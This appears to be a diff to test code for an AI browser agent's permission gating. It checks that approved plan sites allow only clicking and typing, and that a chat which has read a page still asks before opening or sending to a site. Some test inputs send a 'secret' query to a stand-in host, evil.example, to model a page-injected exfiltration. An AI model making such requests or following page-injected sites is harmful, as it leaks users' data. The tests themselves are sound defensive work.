@@ -64,6 +64,7 @@ const src = (f) => fs.readFileSync(path.join(__dirname, '..', f), 'utf8');
     check('approved text: still asks before buying or sending', /buys, pays, sends, posts, submits or deletes/.test(text), text);
     check('approved text takes translated words', P.approvedText(plan, { head: 'Los', sites: 'Seiten:', risky: 'Fragen:' }).startsWith('Los\n'));
     check('approvedHosts: exactly the plan\'s sites', JSON.stringify(P.approvedHosts(plan)) === '["shop.example.com"]');
+    check('approvedKeys: each plan site as an interact-only key', JSON.stringify(P.approvedKeys(plan)) === '["interact:shop.example.com"]', JSON.stringify(P.approvedKeys(plan)));
     check('approvedHosts: a plan that does not check out allows nothing', P.approvedHosts({ steps: ['a'], sites: ['*.evil.test'] }).length === 0 && P.approvedHosts(null).length === 0);
   }
 
@@ -120,9 +121,10 @@ const src = (f) => fs.readFileSync(path.join(__dirname, '..', f), 'utf8');
     msg = await refused(() => inRun({ hosts: new Set() }, async () => { await agent.ensureAllowed('propose_plan', emit, signal, { input: {} }); return agent.proposePlan({ title: 'x', steps: ['a'], sites: [] }); }));
     check('outside plan mode propose_plan is refused', /only for plan mode/.test(msg || ''), msg);
 
-    // Run plan: exactly the plan's sites are allowed for the chat (main.js adds approvedHosts to the chat's hosts)
+    // Run plan: the plan's sites are allowed for clicking and typing in the chat (main.js adds approvedKeys to the chat's hosts)
     const hosts = new Set();
-    for (const h of P.approvedHosts({ title: 'Cart', steps: ['Pay'], sites: ['shop.example.com'] })) hosts.add(h);
+    for (const k of P.approvedKeys({ title: 'Cart', steps: ['Pay'], sites: ['shop.example.com', 'evil.example'] })) hosts.add(k);
+    check('Run plan never adds a plain host (that would skip the open/send card)', ![...hosts].some((k) => !k.startsWith('interact:')), [...hosts].join());
     asked.length = 0;
     msg = await refused(() => inRun({ hosts }, () => agent.ensureAllowed('click', emit, signal, { input: { text: 'Pay' } })));
     check('after Run plan: a click on a plan site asks no card', msg === null && asked.length === 0, `${msg} / ${asked}`);
@@ -135,6 +137,18 @@ const src = (f) => fs.readFileSync(path.join(__dirname, '..', f), 'utf8');
     msg = await refused(() => inRun(tainted, () => agent.ensureAllowed('run_script', emit, signal, { input: { code: '1' }, run: tainted })));
     check('after Run plan: a script after reading a page still asks (its own card)', msg === null && asked.join() === 'script:shop.example.com', asked.join());
     check('the plan\'s sites are not pre-approved for scripts', !hosts.has('script:shop.example.com') || asked.length === 1);
+
+    // A page could have put a site into the plan: in a chat that has read a page, opening it or sending to it still asks
+    for (const [tool, input] of [['navigate', { url: 'https://evil.example/?q=secret' }], ['open_tab', { url: 'https://evil.example/' }], ['read_urls', { urls: ['https://evil.example/x'] }]]) {
+      asked.length = 0;
+      const run = { hosts, tainted: true };
+      msg = await refused(() => inRun(run, () => agent.ensureAllowed(tool, emit, signal, { input, run })));
+      check(`after Run plan, a tainted chat: ${tool} to a plan site still shows the open/send card`, msg === null && asked.join() === 'open:evil.example', `${msg} / ${asked.join()}`);
+      hosts.delete('evil.example'); // (the fake card said yes: forget it for the next tool)
+    }
+    asked.length = 0;
+    msg = await refused(() => inRun({ hosts }, () => agent.ensureAllowed('click', emit, signal, { input: { text: 'Pay' } })));
+    check('...while a click on a plan site still needs no card', msg === null && asked.length === 0, asked.join());
 
     // A saved chat draws the plan card again (transcript item)
     agent.messages = [
@@ -151,7 +165,7 @@ const src = (f) => fs.readFileSync(path.join(__dirname, '..', f), 'utf8');
   // ---- wiring (source guards)
   {
     const main = src('src/main.js');
-    check('main.js: Run plan adds only approvedHosts(plan) to the chat\'s approved sites', /planOpts\.approvedPlan\) for \(const host of planModeLib\.approvedHosts\(planOpts\.approvedPlan\)\) hosts\.add\(host\)/.test(main));
+    check('main.js: Run plan adds only the interact-only keys of the plan\'s sites', /planOpts\.approvedPlan\) for \(const key of planModeLib\.approvedKeys\(planOpts\.approvedPlan\)\) hosts\.add\(key\)/.test(main) && !/approvedHosts\(planOpts/.test(main));
     check('main.js: an approved plan never runs in plan mode', /else if \(planOpts\.plan === true\) askExtra\.plan = true/.test(main));
     const agentSrc = src('src/ai/agent.js');
     check('agent.js: planCheck runs before any card or outside tool in ensureAllowed', agentSrc.indexOf('this.planCheck(name, input, run);') > 0 && agentSrc.indexOf('this.planCheck(name, input, run);') < agentSrc.indexOf('if (this.isExternalTool(name)) return this.allowExternal(name, input, gate);'));
